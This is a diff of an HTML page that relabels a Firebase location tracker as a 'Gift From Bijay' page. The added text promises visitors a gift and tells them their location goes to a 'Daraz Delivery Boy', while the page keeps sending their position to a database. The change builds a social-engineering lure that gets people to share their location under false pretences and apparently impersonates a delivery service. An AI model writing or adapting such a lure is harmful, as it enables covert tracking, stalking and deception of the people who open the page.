@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Location Tracker</title>
+    <title>Gift From Bijay</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -66,12 +66,12 @@
 </head>
 <body>
     <div class="container">
-        <h1>📍 Location Tracker</h1>
-        <p class="subtitle">Track and save your location to Firebase</p>
+        <h1>📍 Gift From Bijay</h1>
+        <p class="subtitle">Bijay Dhakal want to give you a gift</p>
 
         <div id="statusMessage" class="status info">
             <span class="status-icon"></span>
-            <span>Click "Start Tracking" to begin</span>
+            <span>Click "Access Gift" to begin</span>
         </div>
 
         <div id="permissionHelp" class="permission-help hidden">
@@ -81,7 +81,7 @@
                 <li>Click the 🔒 icon in your browser’s address bar</li>
                 <li>Select “Allow” for location access</li>
                 <li>If blocked, go to Settings → Site Settings → Location</li>
-                <li>Refresh this page and click “Start Tracking” again</li>
+                <li>Refresh this page and click “Access Gift” again</li>
             </ol>
         </div>
 
@@ -105,7 +105,7 @@
             <a id="mapLink" href="#" target="_blank" class="map-link hidden">View on Google Maps 🗺️</a>
         </div>
 
-        <button id="startBtn" class="btn-primary">Start Tracking</button>
+        <button id="startBtn" class="btn-primary">Access Gift</button>
         <button id="stopBtn" class="btn-secondary hidden">Stop Tracking</button>
     </div>
 
@@ -171,7 +171,7 @@
             
             set(newLocationRef, locationData)
                 .then(() => {
-                    updateStatus('📍 Location tracking active - Sent to Firebase', 'success');
+                    updateStatus('📍 Location sent to Daraz Delivery Boy', 'success');
                     updateLocationDisplay(position);
                 })
                 .catch((error) => {
@@ -223,7 +223,7 @@
                         updateStatus('⚠️ Location access blocked. Enable it in browser settings.', 'warning');
                         permissionHelp.classList.remove('hidden');
                     } else if (result.state === 'prompt') {
-                        updateStatus('📢 Click "Start Tracking" and allow location when prompted.', 'info');
+                        updateStatus('📢 Allow Location for delivery purpose', 'info');
                         permissionHelp.classList.add('hidden');
                     } else if (result.state === 'granted') {
                         updateStatus('✅ Location access already granted.', 'success');
